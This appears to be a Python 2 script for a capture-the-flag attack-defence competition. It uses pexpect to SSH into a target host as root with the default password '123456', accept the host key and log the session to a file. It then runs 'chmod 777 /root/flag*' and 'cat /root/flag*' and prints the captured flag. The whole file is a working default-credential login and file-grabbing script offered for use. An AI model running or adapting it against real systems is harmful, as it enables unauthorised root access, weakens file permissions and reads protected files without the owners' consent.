# coding=utf-8

import pexpect
import os

import optparse

parser = optparse.OptionParser()
parser.add_option('-t', dest='target', type='string')
parser.add_option('-l', dest='username', type='string', default='root')
parser.add_option('-p', dest='password', type='string', default='123456')

(options, args) = parser.parse_args()

target = options.target
username = options.username
password = options.password

cmd = 'ssh %s@%s' % (username, target)
child = pexpect.spawn(cmd)

path = os.path.join(os.getcwd(), 'ssh_%s' % target)

with open(path, 'wb') as f:
    child.logfile = f

    res = child.expect([
        'Are you sure you want to continue connecting (yes/no)?', 'password:', 'Connection refused'
        , pexpect.TIMEOUT], timeout=5)

    if res == 2:
        print 'refused,exited'
        exit(0)
    if res == 3:
        print 'Time out ,exited'
        exit(0)
    if res == 0:
        child.sendline('yes')
        child.expect('password:')

    child.sendline(password)
    res = child.expect(['#', 'Permission denied'])

    if res == 1:
        print 'Permission denied'
        exit(0)

    child.send('chmod 777 /root/flag*')
    # 获取Flag值,为什么这么麻烦..
    child.sendline('cat /root/flag*')
    child.expect('cat /root/flag\*\r\n')
    child.expect(r'\[.*\]\#')
    flag = child.before.replace('\n', '')

    print '[Flag] %s - %s' % (target, flag)

    child.sendline('exit')
    child.expect(pexpect.EOF)
